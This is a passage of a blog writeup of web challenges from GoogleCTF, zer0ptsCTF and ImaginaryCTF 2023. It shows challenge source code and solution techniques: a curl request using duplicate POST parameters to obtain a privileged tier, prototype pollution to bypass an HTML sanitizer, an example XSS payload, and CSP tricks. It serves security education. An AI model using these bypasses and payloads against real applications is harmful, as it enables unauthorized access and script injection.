<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 Writeup - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="google-adsense-account" content="ca-pub-1121865251398741">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1121865251398741"
     crossorigin="anonymous"></script>


            
<link href="https://blog.huli.tw/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2023/07/28/en/google-zer0pts-imaginary-ctf-2023-writeup/">
    





    <meta name="description" content="A while ago, I was busy traveling and didn’t have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break">
<meta property="og:type" content="article">
<meta property="og:title" content="GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 Writeup">
<meta property="og:url" content="https://blog.huli.tw/2023/07/28/en/google-zer0pts-imaginary-ctf-2023-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="A while ago, I was busy traveling and didn’t have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/google-zer0pts-imaginary-ctf-2023-writeup/cover-en.png">
<meta property="article:published_time" content="2023-07-28T06:10:44.000Z">
<meta property="article:modified_time" content="2023-07-29T12:30:21.520Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/google-zer0pts-imaginary-ctf-2023-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 Writeup" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#googlectf-2023">1&nbsp;&nbsp;<b>GoogleCTF 2023</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#under-construction-466-solves">1.1&nbsp;&nbsp;UNDER-CONSTRUCTION (466 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#biohazard-14-solves">1.2&nbsp;&nbsp;BIOHAZARD (14 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#veggie-soda-13-solves">1.3&nbsp;&nbsp;VEGGIE SODA (13 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#postviewer-v2-7-solves">1.4&nbsp;&nbsp;POSTVIEWER V2 (7 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#noteninja-3-solves">1.5&nbsp;&nbsp;NOTENINJA (3 solves)</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#zer0ptsctf-2023">2&nbsp;&nbsp;<b>zer0ptsCTF 2023</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#warmuprofile-48-solves">2.1&nbsp;&nbsp;Warmuprofile (48 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#jqi-40-solves">2.2&nbsp;&nbsp;jqi (40 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#neko-note-26-solves">2.3&nbsp;&nbsp;Neko Note (26 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#scoreshare-16-solves">2.4&nbsp;&nbsp;ScoreShare (16 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#ringtone-14-solves">2.5&nbsp;&nbsp;Ringtone (14 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#plain-blog-14-solves">2.6&nbsp;&nbsp;Plain Blog (14 solves)</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#imaginaryctf-2023">3&nbsp;&nbsp;<b>ImaginaryCTF 2023</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#sanitized-5-solves">3.1&nbsp;&nbsp;Sanitized (5 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#sanitized-revenge-3-solves">3.2&nbsp;&nbsp;Sanitized Revenge (3 solves)</a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 Writeup
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2023-07-28T06:10:44.000Z" itemprop="datePublished">28 July 2023</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>A while ago, I was busy traveling and didn’t have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break the streak, so I quickly wrote another one to make up for it.</p>
<p>Regarding the three CTFs mentioned in the title, I only participated in GoogleCTF 2023. For the other two events, I only briefly looked at the challenges, so this post will only serve as a note on the challenges and their solutions.</p>
<p>Keyword list:</p>
<ol>
<li>Inconsistent order of POST data parsing between Flask and PHP</li>
<li>iframe CSP blocking certain script loads</li>
<li>CSRF bypass using HEAD method</li>
<li>Accessing parent origin using <code>location.ancestorOrigins</code></li>
<li>Changing iframe location doesn’t affect the src</li>
<li>Angular CSP bypass gadget in recaptcha URL</li>
<li>Restoring input using <code>document.execCommand(&#39;undo&#39;);</code></li>
<li>X-HTTP-Method-Override</li>
<li>Differences between HTML and XHTML parsers</li>
</ol>
<span id="more"></span>

<h2><span id="googlectf-2023">GoogleCTF 2023</span></h2><p>Here is the complete official challenge content and solution: <a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/tree/master/2023">https://github.com/google/google-ctf/tree/master/2023</a></p>
<h3><span id="under-construction-466-solves">UNDER-CONSTRUCTION (466 solves)</span></h3><p>The core code for this challenge is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@authorized<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/signup'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">signup_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    raw_request <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
    tier <span class="token operator">=</span> models<span class="token punctuation">.</span>Tier<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tier'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>tier <span class="token operator">==</span> models<span class="token punctuation">.</span>Tier<span class="token punctuation">.</span>GOLD<span class="token punctuation">)</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">'GOLD tier only allowed for the CEO'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">15</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">'Username length must be between 4 and 15'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    user <span class="token operator">=</span> models<span class="token punctuation">.</span>User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> user<span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">'Username address already exists'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.signup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    new_user <span class="token operator">=</span> models<span class="token punctuation">.</span>User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span> 
        password<span class="token operator">=</span>generate_password_hash<span class="token punctuation">(</span>password<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tier<span class="token operator">=</span>tier<span class="token punctuation">.</span>name<span class="token punctuation">)</span>

    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>new_user<span class="token punctuation">)</span>
    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>PHP_HOST<span class="token punctuation">&#125;</span></span><span class="token string">:1337/account_migrator.php"</span></span><span class="token punctuation">,</span> 
        headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"token"</span><span class="token punctuation">:</span> TOKEN<span class="token punctuation">,</span> <span class="token string">"content-type"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"content-type"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>raw_request<span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'authorized.login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>There is a registration feature that checks the parameters in the data. After the check, the request is forwarded to PHP. Our goal is to create a user with a tier of GOLD.</p>
<p>The solution exploits the inconsistency in POST data parsing between PHP and Flask. If we pass <code>a=1&amp;a=2</code>, Flask will retrieve <code>1</code> (the first one) for the parameter <code>a</code>, while PHP will retrieve <code>2</code> (the last one).</p>
<p>Therefore, by leveraging this inconsistency, we can create a legitimate user in Flask with the tier set to GOLD when forwarding the request to PHP:</p>
<pre class="line-numbers language-none"><code class="language-none">curl -X POST http:&#x2F;&#x2F;&lt;flask-challenge&gt;&#x2F;signup -d &quot;username&#x3D;username&amp;password&#x3D;password&amp;tier&#x3D;blue&amp;tier&#x3D;gold&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3><span id="biohazard-14-solves">BIOHAZARD (14 solves)</span></h3><p>This challenge allows you to create a note, and the goal is to perform an XSS attack.</p>
<p>During the rendering of the note, there is a prototype pollution vulnerability. The rendering process first sanitizes the input:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.dom'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.dom.safe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.html.sanitizer.unsafe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.html.sanitizer.HtmlSanitizer.Builder'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
goog<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'goog.string.Const'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> Const <span class="token operator">=</span> goog<span class="token punctuation">.</span>string<span class="token punctuation">.</span>Const<span class="token punctuation">;</span>
  <span class="token keyword">var</span> unsafe <span class="token operator">=</span> goog<span class="token punctuation">.</span>html<span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span>unsafe<span class="token punctuation">;</span>
  <span class="token keyword">var</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">goog<span class="token punctuation">.</span>html<span class="token punctuation">.</span>sanitizer<span class="token punctuation">.</span>HtmlSanitizer<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  builder <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">alsoAllowTags</span><span class="token punctuation">(</span>
      Const<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'IFRAME is required for Youtube embed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builder<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'IFRAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  sanitizer <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">alsoAllowAttributes</span><span class="token punctuation">(</span>
      Const<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'iframe#src is required for Youtube embed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> builder<span class="token punctuation">,</span>
      <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">tagName</span><span class="token operator">:</span> <span class="token string">'iframe'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">attributeName</span><span class="token operator">:</span> <span class="token string">'src'</span><span class="token punctuation">,</span>
        <span class="token function-variable function">policy</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">?</span> s <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function-variable function">setInnerHTML</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">elem<span class="token punctuation">,</span> html</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  goog<span class="token punctuation">.</span>dom<span class="token punctuation">.</span>safe<span class="token punctuation">.</span><span class="token function">setInnerHtml</span><span class="token punctuation">(</span>elem<span class="token punctuation">,</span> html<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This sanitizer can be bypassed partially through prototype pollution. You cannot use new tags, but you can bypass attribute restrictions. For example, iframes are allowed, so you can use iframe srcdoc.</p>
<p>There is a complication with the CSP: <code>base-uri &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39; &#39;unsafe-eval&#39;; require-trusted-types-for &#39;script&#39;;</code>. It includes trusted types, so even though you can inject <code>&lt;img src=x onerror=alert(1)&gt;</code>, the underlying sanitizer triggers a trusted types error when executing <code>img.setAttribute(&#39;onerror&#39;,&#39;alert(1)&#39;)</code>, causing the attack to fail.</p>
<p>I struggled for a while to bypass this restriction. Eventually, I had the idea that there are test HTML files under the static folder. If any of those files have an XSS vulnerability, we can simply use an iframe src to obtain the flag. I did some searching at the time but couldn’t find any suitable file. However, after the competition, I saw that someone did manage to solve it using this file: <a target="_blank" rel="noopener" href="https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html">https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html</a></p>
<p>Later, I realized that the way it loads JavaScript is like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/closure-library/closure/goog/base.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/bootstrap.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/sanitizer.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/main.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i8OeY0yF3xOOTZVZHHBqIg==<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>There is a variable called <code>editor</code> defined in <code>bootstrap.js</code>, which is then loaded as a script src in <code>main.js</code>. If we block the loading of <code>bootstrap.js</code> using iframe csp and then combine it with polluting <code>Object.prototype.editor</code>, we can load any JS.</p>
<p>And this is indeed the intended solution.</p>
<p>I learned this trick in the <a target="_blank" rel="noopener" href="https://github.com/aszx87410/ctf-writeups/issues/48">Intigriti’s November XSS challenge</a>, where CSP was tightened to prevent the loading of certain scripts.</p>
<h3><span id="veggie-soda-13-solves">VEGGIE SODA (13 solves)</span></h3><p>During the competition, one of my teammates solved this completely without my help.</p>
<p>After the competition, I looked at the official solution. The first level bypasses CSRF protection using HEAD, which seems to be a commonly used technique. The second level looks similar to last year’s <a href="https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves">HORKOS</a>, involving JS deserialization vulnerability. Once a gadget chain is found, XSS can be achieved.</p>
<p>Here is the link to the official solution: <a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/tree/master/2023/web-vegsoda">https://github.com/google/google-ctf/tree/master/2023/web-vegsoda</a></p>
<h3><span id="postviewer-v2-7-solves">POSTVIEWER V2 (7 solves)</span></h3><p>This challenge is the reason why I kept avoiding writing a writeup. It’s like the movie Inception, with layer upon layer, so complex that I didn’t even know what I was doing towards the end.</p>
<p>Although it’s called V2, it’s quite different from last year’s challenge.</p>
<p>Let’s focus on this part:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">previewIframe</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> shimUrl<span class="token punctuation">,</span> container<span class="token punctuation">,</span> sandbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'allow-scripts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>shimUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">generateRandomPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>
    container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
    iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        iframe<span class="token punctuation">.</span>contentWindow<span class="token operator">?.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> sandbox<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Here, a random sbx domain iframe is added, and the flag is passed through postMessage. The content of this sbx domain is also simple:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">TRUSTED_ORIGIN</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
